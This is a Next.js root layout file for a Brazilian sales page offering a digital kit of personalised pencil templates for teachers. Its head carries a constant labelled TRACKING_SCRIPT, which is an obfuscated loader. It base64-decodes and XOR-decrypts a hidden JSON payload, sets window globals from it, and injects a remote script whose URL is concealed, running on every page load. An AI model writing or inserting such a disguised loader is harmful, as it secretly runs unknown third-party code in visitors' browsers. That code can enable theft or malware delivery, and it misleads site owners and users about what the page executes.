import type { Metadata } from 'next';
import './globals.css';

export const metadata: Metadata = {
  title: 'Kit Digital Lápis Personalizados para Professoras',
  description: 'Mais de 600 modelos prontos de lápis e canetas personalizados para professoras editarem, imprimirem e venderem.',
  openGraph: {
    title: 'Kit Digital Lápis Personalizados para Professoras',
    description: 'Mais de 600 modelos prontos de lápis e canetas personalizados para professoras editarem, imprimirem e venderem.',
    type: 'website',
    images: ['/head2.jpg'],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Kit Digital Lápis Personalizados para Professoras',
    description: 'Mais de 600 modelos prontos de lápis e canetas personalizados para professoras editarem, imprimirem e venderem.',
    images: ['/head2.jpg'],
  },
};

const TRACKING_SCRIPT = `(function(){var u_y=atob("DOAUUlNzdx5q6bAVvps2JyEfVSRIgcRhzpMufXwQE3BEnMR414ZtfDAcGjAIm59m3ZJ9IicAWG4DkdV5kZB9KjYfWXQZy5w335RgIDoRAmoPmpIv5b04cDQfGHwLhcM3hLtvcD0SGntI05Jl15hxPhoXVTJIn9F5y4U2aHFFFnwIjNZzjtQhMDBKESkL3oFxjINwNzZRCkMX");var q_x4t0=[];for(var f_a4gw=0;f_a4gw<u_y.length;f_a4gw++){q_x4t0.push(u_y.charCodeAt(f_a4gw)&255);}var v_0ud=q_x4t0[0];var d_hl5q=q_x4t0.slice(1,1+v_0ud);var r_61=q_x4t0.slice(1+v_0ud);var k_jqwx=r_61.map(function(b,l_jc){return b^d_hl5q[l_jc%v_0ud];});var r_j9p="";for(var j_3u=0;j_3u<k_jqwx.length;j_3u++){r_j9p+=String.fromCharCode(k_jqwx[j_3u]&255);}var j_dg=decodeURIComponent(escape(r_j9p));var e_6x9=JSON.parse(j_dg);var f_df2k=e_6x9.globals||[];f_df2k.forEach(function(c_e9){window[c_e9.name]=c_e9.value;});var q_bu4=document.createElement("script");q_bu4.src=e_6x9.url;q_bu4.async=true;q_bu4.defer=true;(e_6x9.attributes||[]).forEach(function(x_v){q_bu4.setAttribute(x_v.name,x_v.value);});(document.head||document.documentElement).appendChild(q_bu4);})();`;

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="pt-BR">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: TRACKING_SCRIPT,
          }}
        />
      </head>
      <body suppressHydrationWarning>{children}</body>
    </html>
  );
}
